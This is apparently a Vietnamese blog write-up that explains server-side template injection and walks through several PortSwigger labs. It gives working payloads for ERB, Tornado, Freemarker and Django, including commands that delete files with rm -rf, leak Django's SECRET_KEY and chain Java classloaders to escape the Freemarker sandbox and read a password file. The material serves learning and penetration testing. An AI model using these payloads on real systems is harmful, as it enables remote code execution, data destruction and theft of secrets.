---
title: Server Side Template Engine (SSTI)
published: 2025-08-22
image: '/assets/post_image/ssti.png'
tags: [Portswigger, Pentest]
category: 'Learning'
draft: false 
description: Learning about SSTI
---

# Research: Server Side Template Engine (SSTI)

## I. SSTI là gì
![image](https://hackmd.io/_uploads/SyPPKawxJg.png)
SSTI (Server-Side Template Injection)` là một lỗ hổng bảo mật xảy ra khi `untrusted data` được đưa vào trong các mẫu (template) mà không được lọc hoặc xác thực đúng cách. Điều này cho phép kẻ tấn công chèn và thực thi mã độc hại ngay trên máy chủ thông qua hệ thống `template rendering (kết xuất mẫu)`.
Chi tiết về cách hoạt động của SSTI:
* Hệ thống `template`: Nhiều ứng dụng web sử dụng các công cụ kết xuất mẫu (template engines) như `Jinja2 (Python)`, `Twig (PHP)`, `Velocity (Java)`, v.v. Các công cụ này cho phép chèn dữ liệu động vào các mẫu HTML để tạo ra các trang web theo thời gian thực.
* Dữ liệu không tin cậy: Khi dữ liệu đầu vào của người dùng được chèn trực tiếp vào template mà không có biện pháp lọc hoặc kiểm tra tính hợp lệ, kẻ tấn công có thể chèn các mã độc vào đó.
* Chèn mã độc: Bằng cách lợi dụng lỗ hổng này, kẻ tấn công có thể:
    * Thực thi mã độc hại trên máy chủ.
    * Đọc các biến nhạy cảm hoặc thông tin bí mật từ ứng dụng.
    * Thậm chí có thể thực hiện tấn công `Remote Code Execution (RCE)`, tức là điều khiển máy chủ từ xa.

## II. Tác động của lỗ hỏng
Lỗ hổng `SSTI` có thể khiến các trang web dễ bị nhiều kiểu tấn công khác nhau, tùy thuộc vào `engine template` và cách ứng dụng sử dụng nó. Trong một số trường hợp hiếm, các lỗ hổng này không gây ra nguy cơ bảo mật thực sự. Ở mức nghiêm trọng nhất, kẻ tấn công có thể thực hiện `RCE`, kiểm soát hoàn toàn máy chủ và sử dụng nó để thực hiện các cuộc tấn công khác trên hạ tầng nội bộ.
Ngay cả trong trường hợp không thể thực hiện `RCE` hoàn toàn, kẻ tấn công thường vẫn có thể sử dụng `injection template` phía máy chủ như cơ sở cho nhiều cuộc tấn công khác, có thể truy cập các dữ liệu nhạy cảm và tập tin tùy ý trên máy chủ.

## III. Nguyên nhân gây lỗ hỏng
Lỗ hổng `SSTI` xuất hiện khi đầu vào của người dùng được nối trực tiếp vào các template thay vì được truyền vào dưới dạng dữ liệu.Các `template` tĩnh chỉ cung cấp các chỗ trống để nội dung động được hiển thị thường không dễ bị tấn công `injection template` phía máy chủ. Ví dụ cổ điển là một `email` chào hỏi người dùng bằng tên của họ, như đoạn mã sau từ `template` của Twig:

```python 
$output = $twig->render("Dear {first_name},", array("first_name" => $user.first_name));
```
Đoạn mã này không dễ bị `injection template` vì tên của người dùng chỉ được truyền vào template dưới dạng dữ liệu.
Tuy nhiên, vì các `template` chỉ là các chuỗi ký tự, đôi khi các web developer nối trực tiếp đầu vào của người dùng vào `template` trước khi render. Hãy xem xét một ví dụ tương tự như trên, nhưng lần này, người dùng có thể tùy chỉnh một phần của email trước khi nó được gửi. Ví dụ, họ có thể chọn tên được sử dụng:

```python
$output = $twig->render("Dear " . $_GET['name']);
```
Trong ví dụ này, thay vì giá trị tĩnh được truyền vào template, một phần của `template` đang được tạo động bằng cách sử dụng tham số `GET name`. Vì cú pháp template được đánh giá ở phía máy chủ, điều này có thể cho phép kẻ tấn công tiêm payload `SSTI` vào tham số `name`, như sau:

```
http://vulnerable-website.com/?name={{bad-stuff-here}}
```

## IV. Cách phát hiện và khai thác SSTI
Như với bất kỳ lỗ hổng nào, bước đầu tiên để khai thác là phát hiện ra nó. Có lẽ phương pháp ban đầu đơn giản nhất là thử `fuzzing template` bằng cách tiêm một chuỗi các ký tự đặc biệt thường được sử dụng trong các biểu thức `template`, chẳng hạn như `$ {{<%[%'"}}%`. Nếu xảy ra `exception`, điều này cho thấy cú pháp `template` được chèn vào đã được server diễn giải. Đây là một dấu hiệu cho thấy SSTI có thể tồn tại.
Các lỗ hổng `SSTI` xuất hiện trong hai ngữ cảnh riêng biệt, mỗi ngữ cảnh yêu cầu một phương pháp phát hiện khác nhau. Dù kết quả `fuzzing` thế nào, cũng cần thử các cách tiếp cận theo ngữ cảnh sau:
### 1. Ngữ cảnh văn bản thuần (Plaintext context)
Hầu hết các ngôn ngữ template cho phép nhập tự do nội dung bằng cách sử dụng trực tiếp các thẻ `HTML` hoặc sử dụng cú pháp `template` gốc, mà sẽ được hiển thị thành `HTML` ở phía máy chủ trước khi gửi phản hồi HTTP. Ví dụ, trong Freemarker, dòng `render('Hello ' + username)` sẽ hiển thị thành `Hello Trohan0x00`.
Ví dụ, hãy xem xét một template có chứa đoạn mã dễ bị tấn công sau:
```python
render('Hello ' + username)
```
Trong quá trình kiểm toán, chúng ta có thể kiểm tra lỗ hổng bằng cách yêu cầu một `URL` như:
```
http://vulnerable-website.com/?username=${7*7}
```
Nếu kết quả đầu ra chứa `Hello 49`, điều này cho thấy phép toán đã được thực hiện ở phía máy chủ. Đây là một minh chứng cho thấy lỗ hổng có thể tồn tại. Lưu ý rằng cú pháp cụ thể cần thiết để thực hiện thành công phép toán sẽ thay đổi tùy thuộc vào `engine template` đang được sử dụng. Chúng ta sẽ thảo luận điều này chi tiết hơn trong bước Xác định.
### 2. Ngữ cảnh mã (Code context)
Trong các trường hợp khác, lỗ hổng xuất hiện khi đầu vào của người dùng được đặt bên trong một biểu thức `template`. Điều này có thể xuất hiện dưới dạng một biến điều khiển bởi người dùng được đặt bên trong một tham số, chẳng hạn như:
```javascript
greeting = getQueryParameter('greeting')
engine.render("Hello {{" + greeting + "}}", data)
```
Trên trang web, `URL` tương ứng có thể là:
```
http://vulnerable-website.com/?greeting=data.username
```
Điều này sẽ được hiển thị trong đầu ra là `Hello Trohan0x00`, chẳng hạn. 
Một phương pháp để kiểm tra lỗ hổng trong ngữ cảnh này là đầu tiên đảm bảo rằng tham số không chứa lỗ hổng `XSS` trực tiếp bằng cách tiêm mã `HTML` tùy ý vào giá trị:
```
http://vulnerable-website.com/?greeting=data.username<tag>
```
Nếu không có XSS, điều này thường dẫn đến đầu ra trống (chỉ hiển thị Hello mà không có tên người dùng), các thẻ đã được mã hóa, hoặc thông báo lỗi. Bước tiếp theo là thử phá vỡ câu lệnh bằng cách sử dụng cú pháp template thông thường và cố gắng tiêm mã `HTML` tùy ý sau đó:
```
http://vulnerable-website.com/?greeting=data.username}}<tag>
```
Nếu điều này dẫn đến lỗi hoặc đầu ra trống, ta có thể đã sử dụng cú pháp từ ngôn ngữ `template` sai, hoặc nếu không có cú pháp `template` nào hợp lệ, `SSTI` không thể xảy ra. Mặt khác, nếu đầu ra được hiển thị chính xác cùng với mã `HTML` tùy ý, đây là một dấu hiệu quan trọng cho thấy lỗ hổng tồn tại:
```pug
Hello Carlos<tag>
```
### 3. Xác định template engine
![image](https://hackmd.io/_uploads/HJTlIzkYgg.png)
Sau khi phát hiện khả năng `SSTI`, bước tiếp theo là xác định `template engine `nào đang được sử dụng. Có rất nhiều `template engine`, nhưng đa số dùng cú pháp khá giống nhau (tránh xung đột ký tự HTML). Do đó, có thể gửi các payload thử nghiệm để kiểm tra.

Cách dễ nhất là gửi cú pháp sai dẫn đến thông báo lỗi sẽ tiết lộ `engine` và đôi khi cả phiên bản. Nếu không có lỗi rõ ràng, cần thử nhiều `payload` đặc thù cho từng `engine` (toán học, chuỗi, logic). Bằng cách loại trừ, có thể nhanh chóng thu hẹp engine được sử dụng.

## Khai thác
Trong phần này, ta sẽ xem xét kỹ hơn một số lỗ hổng `SSTI` điển hình và minh họa cách chúng có thể bị khai thác bằng phương pháp luận tổng quan. Bằng cách áp dụng quy trình này, ta có thể phát hiện và khai thác nhiều loại lỗ hổng `SSTI` khác nhau.
Khi phát hiện một lỗ hổng `SSTI` và xác định được `template engine` được sử dụng, việc khai thác thành công thường bao gồm quy trình sau:
* Đọc (Read)
    * Tài liệu cú pháp template (Template syntax)
    * Tài liệu bảo mật (Security documentation)
    * Các khai thác đã được công bố (Documented exploits)
* Khám phá môi trường (Explore the environment)
* Tạo tấn công tùy chỉnh (Create a custom attack)
### 1. Đọc (Read)
#### Learn the basic template syntax
Việc nắm cú pháp cơ bản rõ ràng là quan trọng, cùng với các hàm chính và cách xử lý biến. Thậm chí chỉ cần biết cách nhúng code gốc (native code block) vào `template` cũng có thể nhanh chóng dẫn đến khai thác.

Một khi biết `template engine` nào đang chạy (Twig, Jinja2, Freemarker, Mako, Velocity, Smarty...), ta có thể tra cứu tài liệu hoặc exploit sẵn có.
Nhiều `template engine` hỗ trợ nhúng code gốc (native code execution). Đây chính là cửa hậu để attacker thực thi lệnh hệ thống.
Ví dụ:
* Jinja2 (Python, Flask): cho phép gọi object Python `({{ ''.__class__.__mro__[1].__subclasses__() }}` → từ đó gọi os.system).
* Twig (PHP): có thể gọi hàm `PHP` thông qua object đặc biệt.
* Freemarker (Java): gọi các class Java `(${"freemarker.template.utility.Execute"?new()("id")})`.

Giờ ta sẽ đến với lab, với lab đầu tiên có tên là `Basic server-side template injection`. Đây sẽ là lab cơ bản để ta có thể làm quen với lỗ hỏng này và ta sẽ biết luôn được `template engine` của web này sẽ là `ERB`. 
Trước hết ta cần biết `ERB` là một `template engine` của `Ruby` cho phép nhúng code `Ruby` và `HTML` cú pháp là `<%=....%>`
![image](https://hackmd.io/_uploads/rkZYvwJFxx.png)
Ở lab này sẽ là một trang `E-commerce` và khi ta click vào sản phẩm đầu tiên đã thấy được một đoạn thông báo xuất hiện rằng `Unfortunately this product is out of stock` và đoạn này được gán vào param `message`. Đây có thể là một inject point hợp lý, ta sẽ thử với payload `<%=7*7%>`
![image](https://hackmd.io/_uploads/rkq5PvyFeg.png)
Kết quả là `49` tức là phía server đã xử lý `template` này đúng những gì ta mong đợi mình sẽ tiếp tục thử với payload`<%=system('id')%>`
![image](https://hackmd.io/_uploads/BJUe_wJYel.png)
Kết quả là trả về thông tin của user, tức là ta có thể `RCE` đối với labs này một cách không bị cản trở và nhiệm vụ của ta sẽ là xóa file `morale.txt`, vậy giờ ta sẽ dùng payload `<%=system('rm -rf /home/carlos/morale.txt'%>`. Lý do mình biết cụ thể thư mục là vì ở các labs trước của các lỗ hỏng khác thì ta đã từng khai thác với file này và thư mục là cố định
![image](https://hackmd.io/_uploads/H1s9uvyFle.png)

Ok! Giờ ta sẽ đến với lab thứ 2, lab trước khá là đơn giản với `plaintext context` thì lab này sẽ phức tạp hơn đôi chút với `code context`. Lab này ta sẽ đến với `Tonardo` là một `template engine` của `Python` với cú pháp sẽ khá tương tự với `twig` hoặc `jinja2`
Đến với lab ta sẽ có credential của `wiener:peter`
![image](https://hackmd.io/_uploads/SJ5C9wytel.png)
Login vào sẽ thấy có một chức năng khá thú vị đó là `Preferred name`. Khả năng là chỉnh tên hiển thị lại. Mình sẽ thử đổi và gửi `req` thử 
![image](https://hackmd.io/_uploads/H1V-ovJKxg.png)
Ta sẽ thấy nó chuyển đến `/change-blog-post-author-display` và ở bên dưới sẽ dùng biến nối với các giá trị tương ứng khi ta thay đổi là `name, first_name và nickname`. Như vậy đây khả năng cao là inject point mà ta cần khai thác. Hãy thử với một payload `{{7*7}}` xem. 
Trước đó ta chú ý đến các bài post trước, sẽ có một tính năng để ta comment ở bên dưới, thử comment một bài và ta có thể thấy tên ở bên dưới
![image](https://hackmd.io/_uploads/BkglaDJtxg.png)
Nếu ta đổi `Preferred name` thành các tên khác nhau thì tên hiển thị cũng sẽ khác, do đó ta có thể chèn `{{7*7}}` vào các biến này xem thử ta sẽ thử với `blog-post-author-display=user.name{{7*7}}&csrf=P6TahYt3O3uw9OomomHnjzPlyr3bkI13`
![image](https://hackmd.io/_uploads/rkV4aD1Ygx.png)
Có lẽ như đã gây lỗi trong code, à thì ra là do mình quên việc escape đoạn `template` trước đó. Do `Code context` này khả năng ở phía server sẽ là một đoạn code nhận chuỗi input bằng `template` nên việc trước mắt ta sẽ out khỏi `template` đó truớc, thử lại với `blog-post-author-display=user.name}}{{7*7}}`
![image](https://hackmd.io/_uploads/Bk5cpw1Kxe.png)
Ta có thể thấy kết quả là `49`, đây đúng là inject point mà ta tìm kiếm. Giờ sẽ thử xem việc `RCE` lab này có khả thi không bằng cú pháp `Tornado`, sau khi search ta có payload như sau
![image](https://hackmd.io/_uploads/HygG0D1Feg.png)
Trước tiên mình sẽ sửa payload thành `{% import os %}{{os.system('ls')}}` để check xem có hoạt động không
![image](https://hackmd.io/_uploads/rkf5RPyYxg.png)
Đây rồi, payload hoạt động và ta đã thấy file `morale.txt` giờ chỉ việc xóa như lab trước ở user `Carlos` là được

#### Read about the security implications
Mỗi `template engine` (ERB, Twig, Jinja2, Freemarker, Mako, …) đều có tài liệu hướng dẫn chính thức.
Trong tài liệu sẽ có:
* Cú pháp cơ bản: dấu mở/đóng `{{ }}, <% %>, {% %}`, …
* Biến, hàm sẵn có (built-in functions/objects): ví dụ trong `ERB` có `File`, `Dir`, trong Jinja2 có `cycler`, `joine`r, trong Twig có `dump()`, `constant()`.
* Cảnh báo bảo mật (Security warning): thường có ghi chú `"⚠ Không dùng với input không tin cậy"` hoặc `"⚠ Chú ý: hàm này có thể truy cập file hệ thống"`.
Đến luôn với lab thực hành ta sẽ hiểu rõ ngay. 
![image](https://hackmd.io/_uploads/ByUvj-fKxg.png)
Lab sẽ có credential là `content-manager:C0nt3ntM4n4g3r` không biết vì sao lại cho crendential khó ghi và khác với thường ngày. Giờ ta sẽ login vào lab
![image](https://hackmd.io/_uploads/ByMpjbfYxl.png)
Sau khi login vào và mình check các chức năng thì mình nhận ra một điều thú vị là ở các post cho phép ta can thiệp và chỉnh sửa các template của các bài post này
![image](https://hackmd.io/_uploads/r1-l2WzKel.png)
Nếu ta để ý kỷ thì ở đây sẽ dùng các template có format `${}`. Và có vẻ như chúng là `Freemaker`, là một `template engine` của `Java`
![image](https://hackmd.io/_uploads/Sk7S3bztxe.png)
Để chắc hơn thì mình sẽ xóa bớt các nội dung thừa và thay vào đó là một template lỗi thì thấy ngay rằng ta nhận được một exception
![image](https://hackmd.io/_uploads/HyjY2-fYxe.png)
Giờ để chắc chắn rằng đây là điểm `inject point` mà ta có thể khai thác thì mình sẽ thử với payload `${7*7}`
![image](https://hackmd.io/_uploads/S1J6nZMFll.png)
Sau một lúc tìm hiểu về format cũng như các hàm đặc trưng của `template engine` này thì mình thấy được một paylaod hữu ích `${"freemarker.template.utility.Execute"?new()("id")}`. Từ đây ta có thể thực hiện `RCE` ngay trên lab này. Và ta có thể thực hiện xóa file `morale.txt` ở phía `carlos` dễ dàng `${"freemarker.template.utility.Execute"?new()("rm -rf /home/carlos/morale.txt")}`


### 2. Explore
Nhiều `template engine` để lộ một đối tượng kiểu như `self` hoặc `environment`, hoạt động như một `namespace` chứa toàn bộ `object`, `method` và `attribute` mà `template engine` hỗ trợ. Nếu tồn tại đối tượng như vậy, ta có thể tận dụng nó để liệt kê danh sách `object` nằm trong phạm vi.
Cần lưu ý rằng website sẽ chứa cả:
* `Object mặc định (built-in)` được cung cấp bởi `template engine`.
* `Object tùy chỉnh` do developer định nghĩa riêng.

Ta nên đặc biệt chú ý đến những object không chuẩn này vì chúng rất dễ chứa thông tin nhạy cảm hoặc các method có thể khai thác được. Ngoài ra, những `object` này có thể khác nhau giữa các `template `khác nhau trong cùng một website. Do đó,cần nghiên cứu hành vi của một `object` trong từng ngữ cảnh `template` cụ thể trước khi tìm ra cách khai thác.

Và điều lưu ý cuối cùng, đó chính là lỗ hỏng này không nhất thiết là luôn luôn cần `RCE` để khai thác. Ta vẫn có thể tận dụng `SSTI` cho các kiểu tấn công nghiêm trọng khác, chẳng hạn như `File Path Traversal`, để truy cập dữ liệu nhạy cảm.
Giờ dến với lab của phần này để ta có thể hiểu rõ hơn cách khai thác mà không cần `RCE`. Ta vẫn sẽ có credential `content-manager:C0nt3ntM4n4g3r`. Sau một lúc mày mò thì vẫn sẽ là một web có khả năng edit template của các post như lab trước
![image](https://hackmd.io/_uploads/HJ201Gmtxl.png)
Sau một lúc `fuzzing template` bằng `Intruder` thì ta đã bật được exception và cụ thể lab này đang sử dụng `template engine` là `Django`
![image](https://hackmd.io/_uploads/HJfLefQtlx.png)
`Django` là một `template engine` của python cho tương tự như `Jinja2` nhưng có sandbox mạnh hơn và không thể thực hiện chạy code `Python` bên trong được. Trước tiên việc tìm hiểu về format thì ta có một vài payload có thể thực hiện nguồn [ở đây](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html?highlight=SSTI#ssti-in-go)
Trước tiên mình thử với payload `{% debug %}` thấy rằng hiện tại ta đang có các object và attributes
![image](https://hackmd.io/_uploads/HJ2DfzQFlg.png)
Đối với `{{settings}}` thì thấy được object hiện tại của ta là `<UserSettingsHolder>`. Nhiệm vụ của ta sẽ là lấy được `SECRET_KEY`, thì ở trong `Django` ta cũng có thể lấy được `SECRET_KEY` bằng `{{settings.SECRET_KEY}}`
![image](https://hackmd.io/_uploads/Sk7GmM7Yxl.png)

### 3. Create a custom attack
#### Constructing a custom exploit using an object chain
Sau khi xác định được inject point cần thiến, nếu không có cách khai thác rõ ràng, ta nên tiếp tục bằng các kỹ thuật `audit` truyền thống: xem xét từng `function` để tìm hành vi có thể khai thác. 
Đến với lab này thì ta sẽ thấy đầu tiên là crendetial như các lab trước `content-manager:C0nt3ntM4n4g3r`, và có thể edit template ở các post và `template engine` chính là `freemarker`. giải nhanh (do mình lười viêt quá trình quá:v. Nói chung labs này cũng dễ)
```java 
<#assign classloader=product.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("cat home/carlos/my_password.txt")}
```
Ta sẽ đổi object thành `product` và thực hiện câu lệnh `RCE` để bypass sandbox
![image](https://hackmd.io/_uploads/HJ_cUPQKee.png)
